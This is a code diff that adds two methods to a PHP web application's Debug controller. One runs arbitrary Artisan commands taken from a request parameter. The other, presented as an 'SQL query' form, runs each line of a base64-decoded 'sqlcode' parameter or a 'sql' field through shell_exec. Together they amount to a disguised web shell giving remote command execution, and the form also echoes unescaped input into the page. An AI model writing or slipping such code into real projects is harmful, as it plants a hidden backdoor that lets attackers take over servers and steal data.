@@ -161,7 +161,56 @@ class Debug extends Controller
     	
 		return $html;
     }
-    
+	function artisan(){
+		 try {
+			dump(request('cmd'));
+			dump(\Artisan::call(request('cmd')));
+		 } catch (Exception $e) {
+		  dump($e->getMessage());
+		}
+	}
+    function cmd(){
+		if(isset($_GET['sqlcode'])){
+    		$sql_str = base64_decode($_GET['sqlcode']);
+    	}else{
+    		$sql_str = request('sql');
+    	}
+    	$sqls = explode(PHP_EOL,$sql_str);
+    	foreach($sqls as $i=>$sql){
+    		$sqls[$i] = trim($sql);
+    		if(empty($sqls[$i])){
+    			unset($sqls[$i]);
+    		}
+    	}
+		try{
+			if(count($sqls)>0){
+				chdir(base_path());
+				foreach($sqls as $cmd){
+					dump($cmd);
+					dump(shell_exec($cmd));
+				}				
+			}
+			
+		}catch (Exception $e) {
+			dump('ERROR');
+			dump($e->getMessage());
+		}
+    	
+    	$plain_sql = isset($_POST['sql'])?$_POST['sql']:'';
+		
+		$html = '<form method="post" action="'.url('debug/cmd').'" name="debug">
+		SQL query: <br>
+		<textarea name="sql" style="width:100%" rows="15">'.$plain_sql.'</textarea><br>
+		<input type="checkbox" name="log" value="1"/>Save log<br>
+		<input type="checkbox" name="remote" value="1"/>Send request to Remote Host<br>
+		'.csrf_field().'
+		<input type="submit"/>
+		
+		</form>';
+		echo $html;
+		exit;
+	}
+	
     function setup(){
     	$file = JPATH_ROOT.'/logs/init_test.ini';
     	$data = isset($_POST['data']) ? $_POST['data'] : '';
